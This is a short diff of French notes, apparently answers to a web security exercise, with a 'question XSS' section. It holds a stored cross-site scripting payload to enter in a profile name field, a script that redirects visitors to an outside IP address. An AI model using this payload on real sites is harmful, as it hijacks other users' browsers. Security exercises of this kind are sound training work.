@@ -6,5 +6,5 @@ password : nimporte quoi
 
 queston XSS
 
-inscrire cette ligne dans le champs nom lorsqu'on veut modifier ses informations personnelles
+inscrire cette ligne dans le champs nom lorsqu'on veut modifier ses informations personnelles : Modification Information Personnel 
 <script type="text/javascript">document.location.href="http://195.34.45.30/hacked.html"</script>
